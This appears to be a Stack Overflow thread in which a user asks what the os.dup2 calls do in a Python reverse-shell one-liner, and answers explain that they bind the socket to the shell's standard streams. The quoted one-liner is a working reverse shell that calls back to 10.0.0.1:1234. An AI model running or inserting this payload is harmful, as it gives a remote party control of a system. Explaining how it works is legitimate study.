<div class="post-text" itemprop="text">
<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code></pre>
<p>I Know this creates a TCP socket that connects to 10.0.0.1 on port 1234. I have a question though.</p>
<p>What do the <code>os.dup2()</code>s do in this case? I know they have to do with file descriptors and that <code>0</code> is <code>STDIN</code>, <code>1</code> is <code>STDOUT</code> and <code>2</code> is <code>STDERR</code>, but I don't know what that does here.</p>
</div>
<div class="post-text" itemprop="text">
<p>As phd commented above, once the TCP ip4 socket is created and establishes a connection on the remote ip and port, the os.dup2() calls the system call <a href="https://www.geeksforgeeks.org/dup-dup2-linux-system-call/" rel="nofollow noreferrer">dup2()</a> to create brand new file descriptors, destroying the original old ones, those brand new file descriptors will be passed into the subshell created by the subprocess statement, so that way the interactive shell will get the fd 0 1 2 from the socket.</p>
<p>If you see the process tree you'll see "/bin/sh -i" is a "subprocess" of the parent process running the socket.</p>
<p><a href="https://i.stack.imgur.com/EivRl.png" rel="nofollow noreferrer"><img alt="Process tree" src="https://i.stack.imgur.com/EivRl.png"/></a></p>
</div>
<div class="post-text" itemprop="text">
<p>It redirects the socket to/from stdin/stdout/stderr in a way that's preserved for subprocesses. I.e., when the code executes <code>/bin/sh</code> the shell inherits the redirections and communicates with the remote user via the socket (without even knowing it).</p>
<p>See <a href="https://docs.python.org/3/library/os.html#os.dup2" rel="nofollow noreferrer">os docs</a>.</p>
</div>
<span class="comment-copy">Man pages can be your friend here.  Use <code>man dup2</code> if you're on unix system, with man pages installed.  Or google it.  Here's a <a href="http://man7.org/linux/man-pages/man2/dup.2.html" rel="nofollow noreferrer">dup2</a> man page.  Basically, it looks like it's making the socket be stdin, stdout, and stderr.  So whatever it's connecting to would then have control of the attached shell.</span>
